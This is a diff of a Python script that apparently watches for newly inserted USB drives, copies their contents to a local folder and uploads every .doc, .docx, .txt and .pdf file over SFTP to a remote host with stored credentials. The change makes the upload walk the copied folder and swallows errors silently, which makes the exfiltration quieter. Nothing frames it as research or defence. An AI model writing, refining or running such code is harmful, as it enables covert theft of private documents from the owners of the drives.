@@ -5,23 +5,21 @@ import shutil
 import paramiko
 
 
-def sftp_upload_file(host, user, pwd, drives):
-    for udisk in drives:
-        try:
-            transport = paramiko.Transport((host, 22))
-            transport.connect(username=user, password=pwd)
-            sftp = paramiko.SFTPClient.from_transport(transport)
+def sftp_upload_file(host, user, pwd, target_dir):
+    try:
+        transport = paramiko.Transport((host, 22))
+        transport.connect(username=user, password=pwd)
+        sftp = paramiko.SFTPClient.from_transport(transport)
 
-            for udisk in drives:
-                for root, dirs, files in os.walk(udisk):
-                    for one in files:
-                        type = os.path.splitext(one)[1]
-                        if type == ".doc" or type == ".docx" or type == ".txt" or type == ".pdf":
-                            sftp.put(os.path.join(root, one),
-                                     (os.path.join(root, one)))
-            pass
-        except Exception as e:
-            print(e)
+        for root, _, files in os.walk(target_dir):
+            for one in files:
+                type = os.path.splitext(one)[1]
+                if type == ".doc" or type == ".docx" or type == ".txt" or type == ".pdf":
+                    sftp.put(os.path.join(root, one),
+                                (os.path.join(root, one)))
+        pass
+    except Exception as _:
+        pass
 
 
 def getremovabledisk():
@@ -69,7 +67,7 @@ if __name__ == '__main__':
             # new U Disk
             drives_bk = drives
             copyfile(drives, target_dir)
-            sftp_upload_file(host, user, pwd, drives)
+            sftp_upload_file(host, user, pwd, target_dir)
         if (drives != drives_bk) & (len(drives_bk) > len(drives)):
             # Disk remove
             drives_bk = drives
